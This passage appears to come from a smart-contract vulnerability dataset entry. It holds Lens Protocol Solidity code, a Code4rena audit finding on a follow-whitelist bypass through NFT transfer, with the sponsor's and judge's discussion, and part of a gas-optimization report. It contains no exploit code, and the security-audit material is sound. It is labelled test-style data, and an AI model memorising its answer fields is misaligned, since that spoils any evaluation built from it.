isCollectModuleWhitelisted(address collectModule)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _collectModuleWhitelisted[collectModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function getGovernance() external view override returns (address) {\n        return _governance;\n    }\n\n    /// @inheritdoc ILensHub\n    function getDispatcher(uint256 profileId) external view override returns (address) {\n        return _dispatcherByProfile[profileId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubCount(uint256 profileId) external view override returns (uint256) {\n        return _profileById[profileId].pubCount;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowNFT(uint256 profileId) external view override returns (address) {\n        return _profileById[profileId].followNFT;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowNFTURI(uint256 profileId) external view override returns (string memory) {\n        return _profileById[profileId].followNFTURI;\n    }\n\n    /// @inheritdoc ILensHub\n    function getCollectNFT(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].collectNFT;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowModule(uint256 profileId) external view override returns (address) {\n        return _profileById[profileId].followModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getCollectModule(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].collectModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getReferenceModule(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].referenceModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getHandle(uint256 profileId) external view override returns (string memory) {\n        return _profileById[profileId].handle;\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubPointer(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (uint256, uint256)\n    {\n        uint256 profileIdPointed = _pubByIdByProfile[profileId][pubId].profileIdPointed;\n        uint256 pubIdPointed = _pubByIdByProfile[profileId][pubId].pubIdPointed;\n        return (profileIdPointed, pubIdPointed);\n    }\n\n    /// @inheritdoc ILensHub\n    function getContentURI(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (string memory)\n    {\n        (uint256 rootProfileId, uint256 rootPubId, ) = Helpers.getPointedIfMirror(\n            profileId,\n            pubId,\n            _pubByIdByProfile\n        );\n        return _pubByIdByProfile[rootProfileId][rootPubId].contentURI;\n    }\n\n    /// @inheritdoc ILensHub\n    function getProfileIdByHandle(string calldata handle) external view override returns (uint256) {\n        bytes32 handleHash = keccak256(bytes(handle));\n        return _profileIdByHandleHash[handleHash];\n    }\n\n    /// @inheritdoc ILensHub\n    function getProfile(uint256 profileId)\n        external\n        view\n        override\n        returns (DataTypes.ProfileStruct memory)\n    {\n        return _profileById[profileId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPub(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (DataTypes.PublicationStruct memory)\n    {\n        return _pubByIdByProfile[profileId][pubId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubType(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (DataTypes.PubType)\n    {\n        if (pubId == 0 || _profileById[profileId].pubCount < pubId) {\n            return DataTypes.PubType.Nonexistent;\n        } else if (_pubByIdByProfile[profileId][pubId].collectModule == address(0)) {\n            return DataTypes.PubType.Mirror;\n        } else {\n            if (_pubByIdByProfile[profileId][pubId].profileIdPointed == 0) {\n                return DataTypes.PubType.Post;\n            } else {\n                return DataTypes.PubType.Comment;\n            }\n        }\n    }\n\n    /**\n     * @dev Overrides the ERC721 tokenURI function to return the associated URI with a given profile.\n     */\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        return _profileById[tokenId].imageURI; // temp\n    }\n\n    /// ****************************\n    /// *****INTERNAL FUNCTIONS*****\n    /// ****************************\n\n    function _setGovernance(address newGovernance) internal {\n        address prevGovernance = _governance;\n        _governance = newGovernance;\n        emit Events.GovernanceSet(msg.sender, prevGovernance, newGovernance, block.timestamp);\n    }\n\n    function _createPost(\n        uint256 profileId,\n        string memory contentURI,\n        address collectModule,\n        bytes memory collectModuleData,\n        address referenceModule,\n        bytes memory referenceModuleData\n    ) internal {\n        PublishingLogic.createPost(\n            profileId,\n            contentURI,\n            collectModule,\n            collectModuleData,\n            referenceModule,\n            referenceModuleData,\n            ++_profileById[profileId].pubCount,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n    }\n\n    function _createComment(DataTypes.CommentData memory vars) internal {\n        PublishingLogic.createComment(\n            vars,\n            _profileById[vars.profileId].pubCount + 1,\n            _profileById,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n        _profileById[vars.profileId].pubCount++;\n    }\n\n    function _createMirror(\n        uint256 profileId,\n        uint256 profileIdPointed,\n        uint256 pubIdPointed,\n        address referenceModule,\n        bytes calldata referenceModuleData\n    ) internal {\n        PublishingLogic.createMirror(\n            profileId,\n            profileIdPointed,\n            pubIdPointed,\n            referenceModule,\n            referenceModuleData,\n            ++_profileById[profileId].pubCount,\n            _pubByIdByProfile,\n            _referenceModuleWhitelisted\n        );\n    }\n\n    function _setDispatcher(uint256 profileId, address dispatcher) internal {\n        _dispatcherByProfile[profileId] = dispatcher;\n        emit Events.DispatcherSet(profileId, dispatcher, block.timestamp);\n    }\n\n    function _setProfileImageURI(uint256 profileId, string memory imageURI) internal {\n        _profileById[profileId].imageURI = imageURI;\n        emit Events.ProfileImageURISet(profileId, imageURI, block.timestamp);\n    }\n\n    function _setFollowNFTURI(uint256 profileId, string memory followNFTURI) internal {\n        _profileById[profileId].followNFTURI = followNFTURI;\n        emit Events.FollowNFTURISet(profileId, followNFTURI, block.timestamp);\n    }\n\n    function _clearHandleHash(uint256 profileId) internal {\n        bytes32 handleHash = keccak256(bytes(_profileById[profileId].handle));\n        _profileIdByHandleHash[handleHash] = 0;\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        if (_dispatcherByProfile[tokenId] != address(0)) {\n            _setDispatcher(tokenId, address(0));\n        }\n        super._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    function _validateCallerIsProfileOwnerOrDispatcher(uint256 profileId) internal view {\n        if (msg.sender != ownerOf(profileId) && msg.sender != _dispatcherByProfile[profileId])\n            revert Errors.NotProfileOwnerOrDispatcher();\n    }\n\n    function _validateCallerIsProfileOwner(uint256 profileId) internal view {\n        if (msg.sender != ownerOf(profileId)) revert Errors.NotProfileOwner();\n    }\n\n    function _validateCallerIsGovernance() internal view {\n        if (msg.sender != _governance) revert Errors.NotGovernance();\n    }\n\n    function _validateCallerIsWhitelistedProfileCreator() internal view {\n        if (!_profileCreatorWhitelisted[msg.sender]) revert Errors.ProfileCreatorNotWhitelisted();\n    }\n\n    function getRevision() internal pure virtual override returns (uint256) {\n        return REVISION;\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {IFollowModule} from '../../../interfaces/IFollowModule.sol';\nimport {Errors} from '../../../libraries/Errors.sol';\nimport {Events} from '../../../libraries/Events.sol';\nimport {ModuleBase} from '../ModuleBase.sol';\nimport {FollowValidatorFollowModuleBase} from './FollowValidatorFollowModuleBase.sol';\nimport {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';\n\n/**\n * @title ApprovalFollowModule\n * @author Lens Protocol\n *\n * @notice This follow module only allows addresses that are approved for a profile by the profile owner to follow.\n */\ncontract ApprovalFollowModule is IFollowModule, FollowValidatorFollowModuleBase {\n    // We use a triple nested mapping so that, on profile transfer, the previous approved address list is invalid;\n    mapping(address => mapping(uint256 => mapping(address => bool)))\n        internal _approvedByProfileByOwner;\n\n    constructor(address hub) ModuleBase(hub) {}\n\n    /**\n     * @notice A custom function that allows profile owners to customize approved addresses.\n     *\n     * @param profileId The profile ID to approve/disapprove follower addresses for.\n     * @param addresses The addresses to approve/disapprove for following the profile.\n     * @param toApprove Whether to approve or disapprove the addresses for following the profile.\n     */\n    function approve(\n        uint256 profileId,\n        address[] calldata addresses,\n        bool[] calldata toApprove\n    ) external {\n        if (addresses.length != toApprove.length) revert Errors.InitParamsInvalid();\n        address owner = IERC721(HUB).ownerOf(profileId);\n        if (msg.sender != owner) revert Errors.NotProfileOwner();\n\n        for (uint256 i = 0; i < addresses.length; ++i) {\n            _approvedByProfileByOwner[owner][profileId][addresses[i]] = toApprove[i];\n        }\n\n        emit Events.FollowsApproved(owner, profileId, addresses, toApprove, block.timestamp);\n    }\n\n    /**\n     * @notice This follow module works on custom profile owner approvals.\n     *\n     * @param data The arbitrary data parameter, decoded into:\n     *      address[] addresses: The array of addresses to approve initially.\n     *\n     * @return An abi encoded bytes parameter, which is the same as the passed data parameter.\n     */\n    function initializeFollowModule(uint256 profileId, bytes calldata data)\n        external\n        override\n        onlyHub\n        returns (bytes memory)\n    {\n        address owner = IERC721(HUB).ownerOf(profileId);\n\n        if (data.length > 0) {\n            address[] memory addresses = abi.decode(data, (address[]));\n            for (uint256 i = 0; i < addresses.length; ++i) {\n                _approvedByProfileByOwner[owner][profileId][addresses[i]] = true;\n            }\n        }\n        return data;\n    }\n\n    /**\n     * @dev Processes a follow by:\n     *  1. Validating that the follower has been approved for that profile by the profile owner\n     */\n    function processFollow(\n        address follower,\n        uint256 profileId,\n        bytes calldata data\n    ) external override onlyHub {\n        address owner = IERC721(HUB).ownerOf(profileId);\n        if (!_approvedByProfileByOwner[owner][profileId][follower])\n            revert Errors.FollowNotApproved();\n        _approvedByProfileByOwner[owner][profileId][follower] = false; // prevents repeat follows\n    }\n\n    /**\n     * @dev We don't need to execute any additional logic on transfers in this follow module.\n     */\n    function followModuleTransferHook(\n        uint256 profileId,\n        address from,\n        address to,\n        uint256 followNFTTokenId\n    ) external override {}\n\n    /**\n     * @notice Returns whether the given address is approved for the profile owned by a given address.\n     *\n     * @param profileOwner The profile owner of the profile to query the approval with.\n     * @param profileId The token ID of the profile to query approval with.\n     * @param toCheck The address to query approval for.\n     *\n     * @return\n     */\n    function isApproved(\n        address profileOwner,\n        uint256 profileId,\n        address toCheck\n    ) external view returns (bool) {\n        return _approvedByProfileByOwner[profileOwner][profileId][toCheck];\n    }\n\n    /**\n     * @notice Returns whether the given addresses are approved for the profile owned by a given address.\n     *\n     * @param profileOwner The profile owner of the profile to query the approvals with.\n     * @param profileId The token ID of the profile to query approvals with.\n     * @param toCheck The address array to query approvals for.\n     */\n    function isApprovedArray(\n        address profileOwner,\n        uint256 profileId,\n        address[] calldata toCheck\n    ) external view returns (bool[] memory) {\n        bool[] memory approved = new bool[](toCheck.length);\n        for (uint256 i = 0; i < toCheck.length; ++i) {\n            approved[i] = _approvedByProfileByOwner[profileOwner][profileId][toCheck[i]];\n        }\n        return approved;\n    }\n}\n\n\n",
        "CodeNames": [
            "FollowNFT.sol",
            "LensHub.sol",
            "ApprovalFollowModule.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "-01",
                "Location": [
                    "//solidity\nfunction validateFollow(\n        uint256 profileId,\n        address follower,\n        uint256 followNFTTokenId\n    ) external view override {\n        address followNFT = ILensHub(HUB).getFollowNFT(profileId);\n        if (followNFT == address(0)) revert Errors.FollowInvalid();\n        if (followNFTTokenId == 0) {\n            // check that follower owns a followNFT\n            if (IERC721(followNFT).balanceOf(follower) == 0) revert Errors.FollowInvalid();\n        } else {\n            // check that follower owns the specific followNFT\n            if (IERC721(followNFT).ownerOf(followNFTTokenId) != follower)\n                revert Errors.FollowInvalid();\n        }\n    }\n"
                ],
                "Type": "  ApprovalFollowModule.sol  lack of transfer check make it possible for anyone to become follower without approved by the profile owner",
                "Description": "\nPer the comment in ApprovalFollowModule, it aims to create a whitelist system:\n\n This follow module only allows addresses that are approved for a profile by the profile owner to follow.\n\nHowever, the current implementation only validates if _approvedByProfileByOwner when minting a new followNFT. But since the follow relationship is verified by the followNFT and the followNFT can be transferred to an arbitrary address.\n\nAs a result, a non-whitelisted address can bypass the whitelist by buying the followNFT from a whitelisted address.\n\nThe followModuleTransferHook can be used for blocking transfers to unapproved addresses.\n\nFollowValidatorFollowModuleBase.sol#L23-L38(https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/FollowValidatorFollowModuleBase.sol#L23-L38)<br\n\nsolidity\nfunction validateFollow(\n        uint256 profileId,\n        address follower,\n        uint256 followNFTTokenId\n    ) external view override {\n        address followNFT = ILensHub(HUB).getFollowNFT(profileId);\n        if (followNFT == address(0)) revert Errors.FollowInvalid();\n        if (followNFTTokenId == 0) {\n            // check that follower owns a followNFT\n            if (IERC721(followNFT).balanceOf(follower) == 0) revert Errors.FollowInvalid();\n        } else {\n            // check that follower owns the specific followNFT\n            if (IERC721(followNFT).ownerOf(followNFTTokenId) != follower)\n                revert Errors.FollowInvalid();\n        }\n    }\n\n\n\n1.  Alice created a private club and selected ApprovalFollowModule with 100 addresses of founding members and wanted to publish publications that can only be collected by those addresses;\n\n2.  Bob as founding members of Alice's private club, decides to sell his membership to Charlie by transfering the followNFT to Charlie, Charlie's address has never be approved by Alice, but he is now a follower in Alice's private club.\n\n",
                "Repair": "\nChange to:\n\nsolidity\n    function followModuleTransferHook(\n        uint256 profileId,\n        address from,\n        address to,\n        uint256 followNFTTokenId\n    ) external override {\n        address owner = IERC721(HUB).ownerOf(profileId);\n        if (!_approvedByProfileByOwner[owner][profileId][to])\n            revert Errors.FollowNotApproved();\n        _approvedByProfileByOwner[owner][profileId][to] = false; // prevents repeat follows\n    }\n\n\noneski (Aave Lens) disputed and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1042476748):\n  This is by design. A more sophisticated module could implement non-transferable behavior or allow transfer only to approved addresses.\n\n0xleastwood (judge) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1118561892):\n  IMO, this is a valid issue. If we want to strictly adhere to the whitelist, we should not allow whitelisted addresses to transfer NFTs to non-whitelisted addresses. This limits the formation of secondary markets where users can bypass whitelist restrictions.\n\nZer0dot (Aave Lens) disagreed with Medium severity and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1125577120):\n  Unfortunately transferrability is in the nature of the protocol. The module's purpose is not to limit follows to only whitelisted wallets (as this is impossible to guarantee in case follow NFTs existed previously, though one could use the validation function etc). Rather, the goal of this module is simply to only allow whitelisted users to mint follow NFTs, what they do with them is up to them. \n \n Due to the confusing nature of the module, I would not dispute this but I would still disagree that it's a medium severity issue, I would mark it as low.\n\n0xleastwood (judge) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1126113275):\n  So if I'm understanding this correctly, whitelisted users who mint follow NFTs are free to do whatever with those, whether they sell them to other parties or give them away. It's completely up to them?\n\n If that's the case, I'll agree and mark this as QA.\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1126121278):\n  Yeah although it's valid enough, this is just how the module works.\n\n0xleastwood (judge) decreased severity to Low and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1126126555):\n  Okay, QA it is, good ser.\n\n\n\n*\n\n# Gas Optimizations\n\nFor this contest, 12 reports were submitted by wardens detailing gas optimizations. The report highlighted below(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47) by Dravee received the top score from the judge.\n\n*The following wardens also submitted reports: IllIllI(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/44), Jujic(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/56), 0x0x0x(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/41), csanuragjain(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/17), defsec(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/74), nahnah(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/75), d4rk(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/13), rfa(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/84), pauliax(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/83), gzeon(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/79), and 0x1f8b(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/39).*\n\n## Table of Contents\n\nSee original submission(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47).\n\n## Foreword\n\n*   @audit tags\n\n The code is annotated at multiple places with //@audit comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## File: FollowNFT.sol\n\n### function getPowerByBlockNumber()\n\n#### Unchecked block\n\n    116:         if (snapshotCount == 0) {\n    117:             return 0; // Returning zero since this means the user never delegated and has no power\n    118:         }\n    119: \n    120:         uint256 lower = 0;\n    121:         uint256 upper = snapshotCount 1; //@audit uncheck (see condition L116)\n\nAs it's impossible for line 121 to underflow (see condition line 116), it should be wrapped inside an unchecked block.\n\n### function getDelegatedSupplyByBlockNumber()\n\n#### Unchecked block\n\n    158:         if (snapshotCount == 0) {\n    159:             return 0; // Returning zero since this means a delegation has never occurred\n    160:         }\n    161: \n    162:         uint256 lower = 0;\n    163:         uint256 upper = snapshotCount 1; //@audit uncheck (see condition line 158)\n\nAs it's impossible for line 163 to underflow (see condition line 158), it should be wrapped inside an unchecked block.\n\n## File: LensHub.sol\n\n### modifier onlyWhitelistedProfileCreator() {\n\n#### A modifier used only once can get inline to save gas\n\nThe modifier onlyWhitelistedProfileCreator is used only once:\n\n    File: LensHub.sol\n    142:     function createProfile(DataTypes.CreateProfileData calldata vars)\n    143:         external\n    144:         override\n    145:         whenNotPaused\n    146:         onlyWhitelistedProfileCreator\n    147:     {\n\nTherefore, it can get inlined in createProfile to save gas\n\n### function setState()\n\n    95:     function setState(DataTypes.ProtocolState newState) external override {\n    96:         if (msg.sender != _governance && msg.sender != _emergencyAdmin) //@audit gas: this is a sad path with always 2 SLOADs. There's a happy path.\n    97:             revert Errors.NotGovernanceOrEmergencyAdmin();\n    98:         _setState(newState);\n    99:     }\n\n#### Short-circuiting can provide a happy path\n\nThe current implementation of function setState favors a sad path which will always cost 2 SLOADs to check the condition.\nIt's possible to short-circuit this condition to provide a happy path which may cost only 1 SLOAD instead.\nI suggest rewriting the function to:\n\n        function setState(DataTypes.ProtocolState newState) external override {\n            if (msg.sender == _governance || msg.sender == _emergencyAdmin) { //@audit-info happy path. Use as 1st condition the most frequent one (here, we assume _governance calls this method the most often)\n              _setState(newState);\n            } else {\n              revert Errors.NotGovernanceOrEmergencyAdmin();\n            }\n        }\n\nAnother alternative:\n\n        function setState(DataTypes.ProtocolState newState) external override {\n            if (msg.sender == _governance || msg.sender == _emergencyAdmin) {\n              _setState(newState);\n              return;\n            }\n            revert Errors.NotGovernanceOrEmergencyAdmin();\n        }\n\n### function getProfileIdByHandle()\n\n    794:     function getProfileIdByHandle(string calldata handle) external view override returns (uint256) {\n    795:         bytes32 handleHash = keccak256(bytes(handle)); //@audit gas: var used only once, inline it\n    796:         return _profileIdByHandleHash[handleHash];\n    797:     }\n\n#### A variable used only once shouldn't get cached\n\nI suggest inlining handleHash L796.\n\n### function _createPost()\n\n    856:     function _createPost(\n    857:         uint256 profileId,\n    858:         string memory contentURI, //@audit gas: should be calldata (calls L333 and L374 are passing a calldata variable)\n    859:         address collectModule,\n    860:         bytes memory collectModuleData, //@audit gas: should be calldata (calls L335 and L376 are passing a calldata variable)\n    861:         address referenceModule,\n    862:         bytes memory referenceModuleData //@audit gas: should be calldata (calls L337 and L378 are passing a calldata variable)\n    863:     ) internal {\n\n#### Use calldata instead of memory for string contentURI\n\n#### Use calldata instead of memory for bytes collectModuleData\n\n#### Use calldata instead of memory for bytes referenceModuleData\n\nFor the 3 memory variables declared in _createPost(), the parent functions are actually passing a calldata variable:\n\n    329:     function post(DataTypes.PostData calldata vars) external override whenPublishingEnabled { //@audit-info vars is using calldata\n    330:         _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n    331:         _createPost(\n    332:             vars.profileId,\n    333:             vars.contentURI, //@audit-info calldata\n    334:             vars.collectModule,\n    335:             vars.collectModuleData, //@audit-info calldata\n    336:             vars.referenceModule,\n    337:             vars.referenceModuleData //@audit-info calldata\n    338:         );\n    339:     }\n    ...\n    342:     function postWithSig(DataTypes.PostWithSigData calldata vars) //@audit-info vars is using calldata\n    343:         external\n    344:         override\n    345:         whenPublishingEnabled\n    346:     {\n    ...\n    372:         _createPost(\n    373:             vars.profileId,\n    374:             vars.contentURI, //@audit-info calldata\n    375:             vars.collectModule,\n    376:             vars.collectModuleData, //@audit-info calldata\n    377:             vars.referenceModule,\n    378:             vars.referenceModuleData //@audit-info calldata\n    379:         );\n\nTherefore, the function declaration should use calldata instead of memory for these 3 parameters.\n\nThis optimization is similar to the one for the internal function _createMirrorin LensNFTBase.sol which uses bytes calldata referenceModuleData:\n\n    File: LensHub.sol\n    890:     function _createMirror(\n    891:         uint256 profileId,\n    892:         uint256 profileIdPointed,\n    893:         uint256 pubIdPointed,\n    894:         address referenceModule,\n    895:         bytes calldata referenceModuleData //@audit-ok : calldata on internal because parent function passes a calldata variable\n    896:     ) internal {\n\n### function _setFollowNFTURI()\n\n    919:     function _setFollowNFTURI(uint256 profileId, string memory followNFTURI) internal { //@audit gas: should be calldata (calls L255 and L285 are passing a calldata variable)\n    920:         _profileById[profileId].followNFTURI = followNFTURI;\n    921:         emit Events.FollowNFTURISet(profileId, followNFTURI, block.timestamp);\n    922:     }\n\n#### Use calldata instead of memory for string followNFTURI\n\nThe parent functions are actually passing a calldata variable:\n\n    289:     function setFollowNFTURI(uint256 profileId, string calldata followNFTURI) //@audit-info calldata\n    290:         external\n    291:         override\n    292:         whenNotPaused\n    293:     {\n    294:         _validateCallerIsProfileOwnerOrDispatcher(profileId);\n    295:         _setFollowNFTURI(profileId, followNFTURI); //@audit-info calldata\n    296:     }\n    ...\n    299:     function setFollowNFTURIWithSig(DataTypes.SetFollowNFTURIWithSigData calldata vars) //@audit-info calldata\n    300:         external\n    301:         override\n    302:         whenNotPaused\n    303:     {\n    ...\n    325:         _setFollowNFTURI(vars.profileId, vars.followNFTURI); //@audit-info calldata\n    326:     }\n\nTherefore, the function declaration should use calldata instead of memory for string followNFTURI\n\nThis optimization is similar to the one for the internal function _createMirrorin LensNFTBase.sol which uses bytes calldata referenceModuleData.\n\n### function _validateCallerIsProfileOwnerOrDispatcher()\n\n    940:     function _validateCallerIsProfileOwnerOrDispatcher(uint256 profileId) internal view {\n    941:         if (msg.sender != ownerOf(profileId) && msg.sender != _dispatcherByProfile[profileId]) //@audit gas: this is a sad path with 2 SLOADs. A happy path is possible\n    942:             revert Errors.NotProfileOwnerOrDispatcher();\n    943:     }\n\n#### Short-circuiting can provide a happy path\n\nThe current implementation of function _validateCallerIsProfileOwnerOrDispatcher favors a sad path which will always cost 2 SLOADs to check the condition.\nIt's possible to short-circuit this condition to provide a happy path which may cost only 1 SLOAD instead.\nI suggest rewriting the function to:\n\n        function _validateCallerIsProfileOwnerOrDispatcher(uint256 profileId) internal view {\n            if (msg.sender == ownerOf(profileId) || msg.sender == _dispatcherByProfile[profileId]) {\n              return;\n            }\n            revert Errors.NotProfileOwnerOrDispatcher();\n        }\n\n## File: LensNFTBase.sol\n\n### function _validateRecoveredAddress()\n\n    159:     function _validateRecoveredAddress(\n    160:         bytes32 digest,\n    161:         address expectedAddress,\n    162:         DataTypes.EIP712Signature memory sig //@audit gas: should be calldata (calls L78, L111 and L152 are passing a calldata variable)\n    163:     ) internal view {\n\n#### Use calldata instead of memory\n\nThe calls to the internal function _validateRecoveredAddress pass a calldata variable:\n\n    51:     function permit(\n    52:         address spender,\n    53:         uint256 tokenId,\n    54:         DataTypes.EIP712Signature calldata sig //@audit-info calldata\n    55:     ) external override {\n    ...\n    78:         _validateRecoveredAddress(digest, owner, sig); //@audit-info calldata\n    ...\n    83:     function permitForAll(\n    84:         address owner,\n    85:         address operator,\n    86:         bool approved,\n    87:         DataTypes.EIP712Signature calldata sig //@audit-info calldata\n    88:     ) external override {\n    ...\n    111:         _validateRecoveredAddress(digest, owner, sig); //@audit-info calldata\n    ...\n    127:     function burnWithSig(uint256 tokenId, DataTypes.EIP712Signature calldata sig) //@audit-info calldata\n    ...\n    152:         _validateRecoveredAddress(digest, owner, sig); //@audit-info calldata\n\nTherefore, the function declaration should use calldata instead of memory\n\nThis optimization is similar to the one for the internal function _createMirrorin LensNFTBase.sol which uses bytes calldata referenceModuleData.\n\n## File: PublishingLogic.sol\n\n### function _initFollowModule()\n\n    342:     function _initFollowModule(\n    343:         uint256 profileId,\n    344:         address followModule,\n    345:         bytes memory followModuleData, //@audit gas: should be calldata (calls L64 and L95 are passing a calldata variable)\n    346:         mapping(address = bool) storage _followModuleWhitelisted\n    347:     ) private returns (bytes memory) {\n\n#### Use calldata instead of memory\n\nThe calls to the private function _initFollowModule pass a calldata variable:\n\n    39:     function createProfile(\n    40:         DataTypes.CreateProfileData calldata vars, //@audit-info calldata\n    ...\n    61:         bytes memory followModuleReturnData = _initFollowModule(\n    62:             profileId,\n    63:             vars.followModule,\n    64:             vars.followModuleData, //@audit-info calldata\n    65:             _followModuleWhitelisted\n    66:         );\n    ...\n    80:     function setFollowModule(\n    81:         uint256 profileId,\n    82:         address followModule,\n    83:         bytes calldata followModuleData, //@audit-info calldata\n    ...\n    92:         bytes memory followModuleReturnData = _initFollowModule(\n    93:             profileId,\n    94:             followModule,\n    95:             followModuleData, //@audit-info calldata\n    96:             _followModuleWhitelisted\n    97:         );\n\nTherefore, the function declaration should use calldata instead of memory\n\nThis optimization is similar to the one for the internal function _createMirrorin LensNFTBase.sol which uses bytes calldata referenceModuleData.\n\n## General recommendations\n\n### Variables\n\n#### No need to explicitly initialize variables with default values\n\nIf a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: for (uint256 i = 0; i < numIterations; ++i) { should be replaced with for (uint256 i; i < numIterations; ++i) {\n\nInstances include:\n\n    coremodulesfollowApprovalFollowModule.sol:41:        for (uint256 i = 0; i < addresses.length; ++i) {\n    coremodulesfollowApprovalFollowModule.sol:66:            for (uint256 i = 0; i < addresses.length; ++i) {\n    coremodulesfollowApprovalFollowModule.sol:128:        for (uint256 i = 0; i < toCheck.length; ++i) {\n    coreFollowNFT.sol:120:        uint256 lower = 0;\n    coreFollowNFT.sol:162:        uint256 lower = 0;\n    coreLensHub.sol:541:        for (uint256 i = 0; i < vars.datas.length; ++i) {\n    librariesInteractionLogic.sol:47:        for (uint256 i = 0; i < profileIds.length; ++i) {\n    librariesPublishingLogic.sol:403:        for (uint256 i = 0; i < byteHandle.length; ++i) {\n    upgradeabilityVersionedInitializable.sol:29:    uint256 private lastInitializedRevision = 0;\n\nI suggest removing explicit initializations for default values.\n\n#### Pre-increments cost less gas compared to post-increments\n\nAs the solution employs pre-increments for all of its for-loops, I'm sure the sponsor is aware of the fact that pre-increments cost less gas compared to post-increments (about 5 gas)\n\nHowever, some places outside loops were missed.\n\nInstances include:\n\n    coremodulescollectLimitedFeeCollectModule.sol:112:            _dataByPublicationByProfile[profileId][pubId].currentCollects++;\n    coremodulescollectLimitedTimedFeeCollectModule.sol:123:            _dataByPublicationByProfile[profileId][pubId].currentCollects++;\n    coreLensHub.sol:887:        _profileById[vars.profileId].pubCount++;\n\nI suggest only replacing these, as some other places in the solution are actually using post-increments the right way. The logic would break if those other places (not mentioned here) are changed too.\n\n### For-Loops\n\n#### Increments can be unchecked\n\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.\n\nethereum/solidity#10695(https://github.com/ethereum/solidity/issues/10695)\n\nInstances include:\n\n    coremodulesfollowApprovalFollowModule.sol:41:        for (uint256 i = 0; i < addresses.length; ++i) {\n    coremodulesfollowApprovalFollowModule.sol:66:            for (uint256 i = 0; i < addresses.length; ++i) {\n    coremodulesfollowApprovalFollowModule.sol:128:        for (uint256 i = 0; i < toCheck.length; ++i) {\n    coreLensHub.sol:541:        for (uint256 i = 0; i < vars.datas.length; ++i) {\n    librariesInteractionLogic.sol:47:        for (uint256 i = 0; i < profileIds.length; ++i) {\n    librariesPublishingLogic.sol:403:        for (uint256 i = 0; i < byteHandle.length; ++i) {\n\nThe code would go from:\n\n    for (uint256 i; i < numIterations; ++i) {  \n     // ...  \n    }  \n\nto:\n\n    for (uint256 i; i < numIterations;) {  \n     // ...  \n     unchecked { ++i; }  \n    }  \n\nThe risk of overflow is inexistant for a uint256 here.\n\n#### An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.\n\nCaching the array length in the stack saves around 3 gas per iteration.\n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n    coremodulesfollowApprovalFollowModule.sol:41:        for (uint256 i = 0; i < addresses.length; ++i) {\n    coremodulesfollowApprovalFollowModule.sol:66:            for (uint256 i = 0; i < addresses.length; ++i) {\n    coremodulesfollowApprovalFollowModule.sol:128:        for (uint256 i = 0; i < toCheck.length; ++i) {\n    coreLensHub.sol:541:        for (uint256 i = 0; i < vars.datas.length; ++i) {\n    librariesInteractionLogic.sol:47:        for (uint256 i = 0; i < profileIds.length; ++i) {\n    librariesPublishingLogic.sol:403:        for (uint256 i = 0; i < byteHandle.length; ++i) {\n\n### Arithmetics\n\n#### Shift Right instead of Dividing by 2\n\nA division by 2 can be calculated by shifting one to the right.\n\nWhile the DIV opcode uses 